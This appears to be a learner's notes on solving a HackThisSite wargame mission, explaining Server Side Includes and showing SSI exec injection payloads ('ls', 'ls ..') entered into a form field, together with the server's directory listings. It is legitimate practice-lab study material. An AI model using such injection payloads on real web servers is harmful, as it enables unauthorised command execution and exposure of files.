# Description: 

Sam remains confident that an obscured password file is still the best idea, but he screwed up with the calendar program. Sam has saved the unencrypted password file in /var/www/hackthissite.org/html/missions/basic/8/

The password is yet again hidden in an unknown file. Sam's daughter has begun learning PHP, and has a small script to demonstrate her knowledge. Requirements: Knowledge of SSI (dynamic html executed by the server, rather than the browser)

SSI = Server Side Includes

We need to better understand what is SSI 

But SSI is a simple interpreted server-side scripting language used almost exclusively for the World Wide Web which allow us to execute commands using html that is executed by the server side, with that all we need to do is  

# Steps to solve
## 1 Command used to solve:
`<!--#exec cmd="ls"-->`

## Response

path: hackthissite.org/html/missions/basic/8/tmp/randomfile.shtml
body: Hi, tshngmww.shtml hipykpqu.shtml ztxdhjxn.shtml avpfeoie.shtml fviqpmaw.shtml kqbybdzc.shtml dzrnmzgx.shtml npcsygfl.shtml whqxxojt.shtml ylomcmvu.shtml uhdppswp.shtml gzntiicx.shtml dzwbqiuu.shtml qvzuieng.shtml smcerykh.shtml qjhnmhmq.shtml znodwztr.shtml! Your name contains 254 characters.

Since the password file is in /var/www/hackthissite.org/html/missions/basic/8/ it means that is in a superior folder from the first response, so we need to go back to this folder and list its content, with that all we need to use is `ls ..`

# 2 Command used to solve
`<!--#exec cmd="ls .."-->`

## response 
path: https://www.hackthissite.org/missions/basic/8/tmp/fmspaphe.shtml
body: Hi, au12ha39vc.php index.php level8.php tmp! Your name contains 39 characters.

# 3 make request to file to see its content
https://www.hackthissite.org/missions/basic/8/{file.php}


# What did we learnt?
- the /var/www/ folder is used to host web content and pages when using apache servers
- 

# Questions / Objectives 
- How the server process our command in html and return the result in page?
- Create a web server witch process SSI (Server Side Includes)
- Create a web server witch process CGI (Common Gateway Interface)

# important links:

- https://en.wikipedia.org/wiki/Server_Side_Includes
- http://httpd.apache.org/docs/current/howto/ssi.html
- https://nginx.org/en/docs/http/ngx_http_ssi_module.html

# Related Interesting links:

- https://en.wikipedia.org/wiki/Common_Gateway_Interface (CGI)
